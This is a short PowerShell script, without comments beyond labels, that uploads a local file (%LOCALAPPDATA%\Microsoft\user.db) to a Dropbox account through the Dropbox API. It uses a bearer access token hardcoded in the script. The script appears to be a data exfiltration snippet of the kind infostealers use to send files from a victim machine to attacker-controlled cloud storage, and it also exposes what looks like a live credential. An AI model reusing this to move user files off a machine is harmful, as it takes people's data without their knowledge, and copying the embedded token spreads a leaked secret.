# Set the path to the file to upload
$fileToUpload = "$env:LOCALAPPDATA\Microsoft\user.db"

# Set the Dropbox access token
$accessToken = "sl.Bbvw5BqXJMqNcK-5LU1mPMS_Tmk7sGjDbz6f56js_mt7KHtWkjQ8BmLdRlB_g4Y5T1jJlnkLAOnVk4mfZkTArTZQLLfZLCrzD80RUpVk0VvJz_kZPlj99ryk-YN2gCYyx7aUiClOhrak"

# Set the Dropbox API endpoint
$dropboxApiEndpoint = "https://content.dropboxapi.com/2/files/upload"

# Set the Dropbox API headers
$dropboxApiHeaders = @{
    "Authorization" = "Bearer $accessToken"
    "Dropbox-API-Arg" = '{"path":"/user.db","mode":"add","autorename":true,"mute":false}'
    "Content-Type" = "application/octet-stream"
}

# Upload the file to Dropbox
Invoke-RestMethod -Method POST -Uri $dropboxApiEndpoint -Headers $dropboxApiHeaders -InFile $fileToUpload
